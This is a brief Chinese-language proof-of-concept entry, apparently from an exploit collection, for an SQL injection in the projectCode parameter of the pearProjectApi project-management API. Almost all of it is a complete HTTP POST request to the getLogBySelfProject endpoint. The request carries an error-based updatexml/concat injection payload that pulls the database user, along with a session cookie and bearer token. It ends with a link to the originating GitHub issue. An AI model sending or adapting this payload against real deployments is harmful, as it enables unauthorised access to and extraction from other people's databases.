# pearProjectApi系统接口projectCode存在SQL注入漏洞

## poc

```javascript
POST /index.php/project/project/getLogBySelfProject HTTP/2
Host: 
Cookie: se0d06741=5rkiv0sqvn1otra27va1jlfgfo
Content-Length: 100
Sec-Ch-Ua: "Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"
Organizationcode: 6v7be19pwman2fird04gqu53
Sec-Ch-Ua-Mobile: ?0
Authorization: bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiIiLCJhdWQiOiIiLCJpYXQiOjE2NzY5NDU0MTAsIm5iZiI6MTY3Njk0NTQxMCwiZGF0YSI6eyJjb2RlIjoiNnY3YmUxOXB3bWFuMmZpcmQwNGdxdTUzIn0sInNjb3BlcyI6ImFjY2VzcyIsImV4cCI6MTY3NzU1MDIxMH0.G18ME7UI0EHAxaTSV751smgNfETb1Q0O0e9mv-6L42I
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept: application/json, text/plain, /
Sec-Ch-Ua-Platform: "macOS"
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9

page=1&pageSize=123&projectCode=121312312312'+or+updatexml(1,concat(0x7e,(select+user()),0x7e),1)%23
```

![image](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202501241001031.png)

## 漏洞来源

- https://github.com/a54552239/pearProjectApi/issues/32